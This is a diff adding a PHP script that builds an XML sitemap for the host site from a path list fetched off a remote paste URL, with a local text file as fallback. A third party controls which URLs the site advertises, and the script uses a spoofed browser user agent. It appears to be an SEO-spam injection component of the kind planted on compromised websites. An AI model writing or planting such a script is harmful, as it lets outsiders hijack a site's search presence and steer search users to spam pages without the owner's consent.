@@ -1,0 +1,146 @@
+<?php
+$remoteList = 'https://paste.phyo186.cfd/1kVXt-jFTHA/raw';
+$localFallback = dirname(__FILE__) . '/brkw.txt';
+$defaultPriority = '1.0';
+
+function is_https() {
+    if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') return true;
+    if (isset($_SERVER['SERVER_PORT']) && (int)$_SERVER['SERVER_PORT'] === 443) return true;
+    if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') return true;
+    if (isset($_SERVER['HTTP_CF_VISITOR']) && strpos($_SERVER['HTTP_CF_VISITOR'], '"scheme":"https"') !== false) return true;
+    return false;
+}
+
+function detect_base_url() {
+    $scheme = is_https() ? 'https' : 'http';
+
+    $x_forwarded_host = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : null;
+    $http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : null;
+    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
+    
+    $host = $x_forwarded_host ? $x_forwarded_host : ($http_host ? $http_host : $server_name);
+
+    $script_name = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/';
+    $dir = rtrim(str_replace('\\', '/', dirname($script_name)), '/');
+    if ($dir !== '') $dir .= '/'; else $dir = '/';
+
+    return $scheme . '://' . $host . $dir;
+}
+
+function http_get_with_headers($url, $timeout = 15) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        $headers = array(
+            'Accept: text/plain, */*;q=0.8',
+            'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Cache-Control: no-cache',
+            'Pragma: no-cache'
+        );
+        
+        $curl_options = array(
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_CONNECTTIMEOUT => $timeout,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_MAXREDIRS => 5,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+            CURLOPT_ENCODING => '',
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_SSL_VERIFYHOST => 2,
+        );
+        
+        foreach ($curl_options as $option => $value) {
+            curl_setopt($ch, $option, $value);
+        }
+        
+        $body = curl_exec($ch);
+        $err  = curl_error($ch);
+        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($body !== false && $code >= 200 && $code < 400) {
+            return $body;
+        }
+    }
+
+    $opts = array(
+        'http' => array(
+            'method'  => 'GET',
+            'timeout' => $timeout,
+            'ignore_errors' => true,
+            'header'  => implode("\r\n", array(
+                'Accept: text/plain, */*;q=0.8',
+                'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Cache-Control: no-cache',
+                'Pragma: no-cache',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
+            ))
+        )
+    );
+    $context = stream_context_create($opts);
+    $body = @file_get_contents($url, false, $context);
+    if ($body !== false) return $body;
+
+    return null;
+}
+
+function strip_bom($s) {
+    return preg_replace('/^\xEF\xBB\xBF/', '', $s);
+}
+
+$listContent = http_get_with_headers($remoteList);
+
+if ($listContent === null && file_exists($localFallback)) {
+    $listContent = @file_get_contents($localFallback);
+}
+
+if ($listContent === null) {
+    header('Content-Type: text/plain; charset=utf-8', true, 502);
+    echo "Gagal mengambil data dari URL maupun fallback lokal.";
+    exit;
+}
+
+$listContent = strip_bom($listContent);
+
+$lines = preg_split("/\r\n|\r|\n/", $listContent);
+$posts = array();
+foreach ($lines as $line) {
+    $line = trim($line);
+    if ($line === '' || $line[0] === '#') continue;
+    $line = ltrim(str_replace('\\', '/', $line), '/');
+    $posts[] = $line;
+}
+
+$base = detect_base_url();
+
+$pages = array();
+$today = gmdate('Y-m-d');
+
+foreach ($posts as $rawPath) {
+    $hyphenPath = preg_replace('/\s+/u', '-', $rawPath);
+    $hyphenPath = preg_replace('#/{2,}#', '/', $hyphenPath);
+
+    $pages[] = array(
+        'loc'      => rtrim($base, '/') . '/' . $hyphenPath,
+        'lastmod'  => $today,
+        'priority' => $defaultPriority,
+        'original' => $rawPath,
+    );
+}
+
+header('Content-Type: application/xml; charset=utf-8');
+header('X-Content-Type-Options: nosniff');
+header('Cache-Control: public, max-age=300');
+
+echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
+?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+<?php foreach ($pages as $p): ?>
+  <url>
+    <loc><?php echo htmlspecialchars($p['loc'], ENT_QUOTES, 'UTF-8'); ?></loc>
+    <lastmod><?php echo htmlspecialchars($p['lastmod'], ENT_QUOTES, 'UTF-8'); ?></lastmod>
+    <priority><?php echo htmlspecialchars($p['priority'], ENT_QUOTES, 'UTF-8'); ?></priority>
+  </url>
+<?php endforeach; ?>
+</urlset>
